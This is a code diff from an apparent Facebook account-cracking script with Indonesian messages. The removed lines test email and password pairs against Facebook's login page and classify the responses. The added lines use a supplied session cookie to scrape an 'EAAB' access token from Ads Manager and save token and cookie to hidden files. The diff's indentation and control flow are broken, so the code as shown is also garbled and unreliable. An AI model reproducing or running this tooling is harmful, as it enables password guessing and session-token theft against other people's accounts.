@@ -35,23 +35,26 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://id-id.facebook.com/login.php/',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}))
-		except KeyboardInterrupt:
-			sys.exit()
-		except:
-			self.a = 4
-			sys.exit()
-		if 'm_sess' in data.url or 'save-device' in data.url:
-			self.a = 1
-		elif 'checkpoint' in data.url:
-			self.a = 2
+			head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
+		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
+		find = re.findall('act=(.*?)&nav_source', link.text)
+		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
 		else:
-			self.a = 3
-def crack(d):
-	while 1:
-		s = inputD('[?] Sandi')
-		if len(s) < 6:
-			cetak('!m[!] Jumlah huruf minimal !k6')
+			for x in find:
+				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
+				took = re.search('(EAAB\w+)',xz.text).group(1)
+				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
+				exit(f"Token : {took} \ncookies aktif jalankan ulang scriptnya")
+	except Exception as e:exit(e)
+
+def menu():
+	try:
+		token = open('.tok.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except (IOError,KeyError,FileNotFoundError):
+		print(f'{m}cookies telah kadaluarsa bro')
+		time.sleep(4)
+		login()
 		else:
 			break
 	return crack0(d,s)
